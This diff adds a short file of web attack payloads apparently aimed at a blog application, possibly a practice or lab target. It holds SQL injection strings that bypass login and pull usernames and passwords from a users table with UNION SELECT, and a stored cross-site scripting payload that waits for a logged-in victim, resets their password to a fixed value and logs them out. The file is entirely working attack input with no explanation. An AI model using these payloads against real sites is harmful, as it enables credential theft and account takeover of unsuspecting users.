@@ -1,0 +1,36 @@
+Blog SQL Queries
+
+//Test if sql injection works
+mstubenberg' OR '1' = '1
+
+//Replace password for user
+fakeuser' UNION ALL SELECT "test" as test,password FROM users WHERE username = 'attorney1
+
+//Get all the users information using ID
+fakeuser' UNION ALL SELECT username,password FROM users WHERE ID = '2
+
+______________________________
+
+<script>
+console.log("It worked!");
+</script>
+---------------------------------------
+
+---------------------------------------
+
+    <script>
+       setTimeout(function(){
+           console.log("It worked");
+           if($("#accountinfousername").text() != "hackerman"){
+                if($("#logoutbutton").length > 0 && $("#resetpasswordsuccess").length == 0){
+                    $("#resetpassword").val("pa$$word");
+                    $("#resetpasswordbutton").click();
+                }else if($("#resetpasswordsuccess").length > 0){
+                    $("#logoutbutton").click();
+                }else{
+                    console.log("Waiting for user to login");
+                }
+            }
+
+        },1000); 
+    </script>
